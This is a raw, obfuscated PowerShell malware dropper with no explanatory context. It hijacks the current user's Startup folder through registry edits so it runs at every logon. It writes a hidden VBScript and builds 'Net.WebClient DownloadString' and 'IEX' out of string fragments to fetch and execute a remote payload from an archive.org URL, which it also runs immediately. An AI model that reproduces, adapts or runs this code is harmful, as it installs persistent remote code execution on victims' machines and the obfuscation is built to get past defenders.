$H1="C:\Use++++++++++++++++++++un".Replace("++++++++++++++++++++","rs\Public\R")
$H2 = "Crea--------------------ry".Replace("--------------------","teDirecto")
[system.io.directory]::$H2($H1)
start-sleep -s 5
$H3 = "HKCU:\Softw-----------------lders".Replace("-----------------","are\Microsoft\Windows\CurrentVersion\Explorer\User Shell Fo")
$H4= "HKCU:\Softwar+++++++++++++++++++++++++++ders".Replace("+++++++++++++++++++++++++++","e\Microsoft\Windows\CurrentVersion\Explorer\Shell Fol")
$H5 = "C:\Us--------------c\Run".Replace("--------------","ers\Publi")
$H6 ="C------------blic\Run".Replace("------------",":\Users\Pu")

Set-ItemProperty -Path $H3 -Name "Startup" -Value $H5;
Set-ItemProperty -Path $H4 -Name "Startup" -Value $H6;
start-sleep -s 5
$Content = @'
Dim HBANKERS
BBBBBB = "riPt.SHE"
HHHHHH = "Sc"+BBBBBB+"L"
Set HBANKERS= CreateObject("W"+HHHHHH+"L")
Donal="P" &"O" & "W"
Trump = "E"
mike = "R" & "s"&"H" & "E"
pompeo = "L"
Elon ="L"&" $TRU"
HBAR = "MP ='https://ia601402.us.archive.org/14/items/documentary_202108/documentary.txt';$"
WHO = "B ='E"
ERO = "TH COINt."&Chr(87)
H1 = "TF COINlIOSNT'.R"&Chr(69)
AA = chr(80)&"lace('ET"
H2 = "H COIN','nE').R"
DDDDDDDDDDDDDDDDDDDD = "ep"&Chr(76)
BB = "ace('TF CO"
H3 = "IN','EbC').Rep"
CC = Chr(76)&"ace('OS','e');"
MUSK = "$CC = 'DO"
H4 = "S COIN L"&"SOSC"
H5 = "OINnG'.Rep"
DD = Chr(76)&"ace('S CO"
H6 = "IN ','Wn').Rep"&Chr(76)
FF = "ace('SO','oaD').Rep"
GG = Chr(76)&"a"
FFFFFFFFFFFFFFFFFFFFFFFFF = "ce('COIN','TrI');"
SHIB =""
INU ="$A ='I`Eos COI"
H8 = "N`W`BTC CO"
H7 = "INj`ETH COIN $B).$CC($T"
H9 = "RUMP)'.Rep"
KK = Chr(76)&"ace('os CO"
H10 = "IN','X(n`e').Rep"&Chr(76)
TT = "ace('BTC COI"
H11 = "N','-Ob').Rep"
ENB = Chr(76)&"ace('TH CO"
H12 = "IN','`c`T');"
PUMP ="&('I'+'"&Chr(69)
OS = "X')($A -J"
SOS = "oin '')|&('"
HHHHHH = "I'+'E"
EOS = "X');"
COIN = Donal+Trump++mike+pompeo+Elon+HBAR+WHO+ERO+H1+AA+H2+DDDDDDDDDDDDDDDDDDDD+BB+H3+CC+MUSK+H4+H5+DD+H6+FF+GG+FFFFFFFFFFFFFFFFFFFFFFFFF+SHIB+INU+H8+H7+H9+KK+H10+TT+H11+ENB+H12+PUMP+OS+SOS+HHHHHH+EOS+""
HBANKERS.Run COIN,0
'@
Set-Content -Path C:\Users\Public\Run\Run.vbs -Value $Content

start-sleep -s 5

$TRUMP = 'https://ia601402.us.archive.org/14/items/documentary_202108/documentary.txt';
$B = 'ETH COINt.WTF COINlIOSNT'.Replace('ETH COIN','nE').Replace('TF COIN','EbC').Replace('OS','e');
$CC = 'DOS COIN LSOSCOINnG'.Replace('S COIN ','Wn').Replace('SO','oaD').Replace('COIN','TrI');
$A ='I`Eos COIN`W`BTC COINj`ETH COIN $B).$CC($TRUMP)'.Replace('os COIN','X(n`e').Replace('BTC COIN','-Ob').Replace('TH COIN','`c`T');
&('I'+'EX')($A -Join '')|&('I'+'EX');